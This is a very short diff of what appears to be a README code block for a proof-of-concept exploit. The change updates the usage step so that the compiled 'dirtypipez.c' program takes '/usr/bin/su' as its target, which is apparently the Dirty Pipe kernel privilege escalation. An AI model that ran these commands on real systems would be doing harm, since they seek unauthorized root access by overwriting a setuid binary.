@@ -2,5 +2,5 @@
 
 ```
 gcc dirtypipez.c -o poc
-./poc
+./poc /usr/bin/su
 ```
